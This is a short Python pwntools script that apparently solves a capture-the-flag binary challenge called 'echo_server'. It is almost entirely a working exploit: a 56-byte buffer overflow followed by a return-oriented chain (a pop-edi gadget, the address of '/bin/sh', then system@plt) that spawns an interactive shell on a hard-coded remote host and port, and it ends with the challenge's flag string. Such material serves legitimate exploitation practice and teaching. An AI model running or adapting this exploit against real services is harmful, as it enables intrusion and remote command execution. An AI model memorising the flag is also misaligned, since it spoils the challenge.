from pwn import *
context.log_level = 'DEBUG'
def p64(number):
    return pack(number, 64, 'little')

p = process('./echo_server')
#gdb.attach(p, gdbscript=('b *0x0000000000400821\n'))
p = remote('140.110.112.221', 6129)
elf = ELF('./echo_server')

offset = b'A' * 56
system = p64(elf.plt['system'])
bin_sh = p64(next(elf.search(b'/bin/sh\x00')))
pop_edi = p64(0x0400923)
payload = offset + pop_edi + bin_sh + system

p.recvuntil(b'> ')
p.sendline(payload)
p.interactive()
# MyFirstCTF{T4k3_1t_iF_u_w4nt_t0_us3_sIng13_ROPch41n}